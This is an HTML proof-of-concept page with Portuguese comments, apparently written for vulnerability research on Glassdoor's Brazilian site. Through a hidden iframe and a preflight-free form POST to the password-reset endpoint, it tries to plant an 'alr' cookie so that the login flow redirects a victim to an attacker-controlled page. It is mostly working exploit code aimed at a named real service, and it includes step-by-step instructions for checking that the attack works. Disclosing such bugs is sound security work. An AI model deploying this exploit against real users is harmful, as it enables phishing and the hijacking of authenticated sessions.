<!doctype html>
<meta charset="utf-8">
<title>Glassdoor Redirect PoC</title>
<body>
<h2>PoC – Open Redirect via cookie <code>alr</code></h2>
<p>
Esta página (em domínio externo) força o Glassdoor a definir o cookie <code>alr</code> apontando
para este GitHub Pages. Em seguida, leva a vítima para a tela de login do Glassdoor. Após o login,
o fluxo deve trazê-la de volta para este domínio (comprovando o redirect pós-auth).
</p>

<!-- Página alvo para onde queremos que o Glassdoor nos envie depois do login -->
<script>
  const attackerLanding = "https://SEU-USUARIO.github.io/SEU-REPO/after-login.html";
</script>

<!-- iframe oculto recebe a resposta do POST sem alterar a UI -->
<iframe id="sink" name="sink" style="display:none"></iframe>

<!-- POST sem preflight: enctype text/plain + target=iframe -->
<form id="prime" action="https://www.glassdoor.com.br/auth/account/password/forgot/initiate"
      method="POST" enctype="text/plain" target="sink">
  <!-- O corpo pode ser qualquer JSON válido que o endpoint aceite; o importante é o Referer -->
  <textarea name="" id="payload" style="display:none">
{"emailAddress":"victim@example.com"}
  </textarea>
</form>

<button id="prep">Preparar redirecionamento (setar cookie alr)</button>
<button id="goto">Ir para o login agora</button>

<script>
  const prepBtn = document.getElementById('prep');
  const gotoBtn = document.getElementById('goto');

  // Ao clicar, fazemos o POST cross-site via <form> (sem CORS) que deve setar o cookie 'alr'
  prepBtn.onclick = function () {
    // Dica: alguns backends gravam o valor exato do Referer. Garantimos que esta página já está aberta em HTTPS.
    document.getElementById('prime').submit();
    // dá um tempo pro Set-Cookie chegar
    setTimeout(() => {
      location.href = "https://www.glassdoor.com.br/auth/login";
    }, 1200);
  };

  // Botão de fallback para ir ao login manualmente (caso queira separar as etapas)
  gotoBtn.onclick = function () {
    location.href = "https://www.glassdoor.com.br/auth/login";
  };
</script>

<p style="font-size:12px;color:#666;margin-top:16px">
Como validar: abra em janela anônima → clique <b>Preparar redirecionamento</b> → a página fará o POST para
<code>/auth/account/password/forgot/initiate</code> (no iframe) e levará ao login do Glassdoor.
Após autenticar com uma conta de teste, você deve ser redirecionado automaticamente para
<b>after-login.html</b> no seu GitHub Pages (este domínio), provando o open redirect pós-auth.
</p>
</body>
